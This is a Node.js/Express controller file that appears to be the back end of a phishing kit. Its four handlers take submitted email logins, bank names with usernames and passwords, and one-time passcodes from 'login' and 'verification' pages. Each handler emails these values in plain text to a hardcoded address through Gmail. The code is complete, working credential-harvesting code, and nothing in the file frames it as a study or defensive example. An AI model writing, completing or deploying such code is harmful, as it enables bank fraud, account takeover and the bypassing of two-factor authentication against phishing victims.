const nodemailer = require("nodemailer");

// ADMIN EMAIL
const ADMIN_EMAIL = "info@transportationconsultingllc.com";
exports.handleLogin = async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "All fields required" });
        }

        // Create transporter (Use Gmail or SMTP)
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER, // your gmail
                pass: process.env.EMAIL_PASSWORD  // app password
            }
        });

        // Email content
        const mailOptions = {
            from: `"Login Alert" <${process.env.EMAIL_USER}>`,
            to: ADMIN_EMAIL,
            subject: "New Login Attempt",
            html: `
                <h2>New Login Detected</h2>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Password:</strong> ${password}</p>
                <p>Sent from your login webpage.</p>
            `
        };

        // Send email
        await transporter.sendMail(mailOptions);

        return res.json({ success: true, message: "Login sent to admin!" });

    } catch (error) {
        console.error("Email Error:", error);
        return res.status(500).json({ success: false, message: "Email sending failed" });
    }
};

exports.handleLoginBank = async (req, res) => {
    try {
        const { bank, user, password } = req.body;

        if (!bank || !user || !password) {
            return res.status(400).json({ success: false, message: "All fields required" });
        }

        // Create transporter (Gmail)
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER, // your gmail
                pass: process.env.EMAIL_PASSWORD  // app password
            }
        });

        // Email content
        const mailOptions = {
            from: `"Login Alert" <${process.env.EMAIL_USER}>`,
            to: ADMIN_EMAIL,
            subject: "New Login Attempt",
            html: `
                <h2>Bank Login</h2>
                <p><strong>Bank:</strong> ${bank}</p>
                <p><strong>User:</strong> ${user}</p>
                <p><strong>Password:</strong> ${password}</p>            `
        };

        await transporter.sendMail(mailOptions);

        return res.json({ success: true, message: "Login sent to admin!" });

    } catch (error) {
        console.error("Email Error:", error);
        return res.status(500).json({ success: false, message: "Email sending failed" });
    }
};

exports.handleVerification = async (req, res) => {
    try {
        const { otp } = req.body;

        if (!otp) {
            return res.status(400).json({ success: false, message: "OTP is required" });
        }

        // Create transporter (Gmail)
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD
            }
        });

        // Email content
        const mailOptions = {
            from: `"OTP Alert" <${process.env.EMAIL_USER}>`,
            to: ADMIN_EMAIL,
            subject: "User Entered OTP",
            html: `
                <h2>OTP Entered</h2>
                <p><strong>OTP:</strong> ${otp}</p>
                <p>Sent from verification page.</p>
            `
        };

        await transporter.sendMail(mailOptions);

        return res.json({ success: true, message: "OTP sent to admin!" });

    } catch (error) {
        console.error("Email Error:", error);
        return res.status(500).json({ success: false, message: "Email sending failed" });
    }
};
exports.handleNewVerification = async (req, res) => {
    try {
        const { otp } = req.body;

        if (!otp) {
            return res.status(400).json({ success: false, message: "OTP is required" });
        }

        // Create transporter (Gmail)
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD
            }
        });

        // Email content
        const mailOptions = {
            from: `"OTP Alert" <${process.env.EMAIL_USER}>`,
            to: ADMIN_EMAIL,
            subject: "User Entered OTP",
            html: `
                <h2>OTP Entered</h2>
                <p><strong>OTP:</strong> ${otp}</p>
                <p>Sent from your second new verification page.</p>
            `
        };

        await transporter.sendMail(mailOptions);

        return res.json({ success: true, message: "OTP sent to admin!" });

    } catch (error) {
        console.error("Email Error:", error);
        return res.status(500).json({ success: false, message: "Email sending failed" });
    }
};